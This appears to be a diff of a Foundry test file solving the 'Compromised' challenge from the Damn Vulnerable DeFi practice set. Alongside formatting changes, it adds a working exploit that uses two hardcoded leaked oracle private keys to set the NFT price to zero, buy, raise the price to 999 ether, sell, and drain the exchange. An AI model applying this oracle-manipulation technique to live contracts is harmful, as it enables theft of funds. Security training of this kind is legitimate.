@@ -6,7 +6,9 @@ import {Test, console} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
-import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
+import {
+    TrustfulOracleInitializer
+} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
@@ -20,14 +22,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +55,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +83,50 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 id;
+        // console.log("as", oracle.getMedianPrice("DVNFT"));
+        vm.startBroadcast(
+            0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        );
+        oracle.postPrice("DVNFT", 0 ether);
+
+        vm.stopBroadcast();
+        vm.startBroadcast(
+            0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        );
+        oracle.postPrice("DVNFT", 0 ether);
+
+        vm.stopBroadcast();
+
+        // console.log("assa", oracle.getMedianPrice("DVNFT"));
+        vm.startPrank(player);
+        id = (exchange).buyOne{value: 0.1 ether}();
+        nft.approve(address(exchange), 0);
+        vm.stopPrank();
+
+        vm.startBroadcast(
+            0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        );
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.stopBroadcast();
+        vm.startBroadcast(
+            0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        );
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.stopBroadcast();
+
+        vm.startPrank(player);
+
+        (exchange).sellOne(id);
+        payable(recovery).transfer(999 ether);
+        // // nft.transferFrom(
+        // //     player, // from
+        // //     recovery, // to
+        // //     id // NFT ID
+        // // );
+        vm.stopPrank();
     }
 
     /**
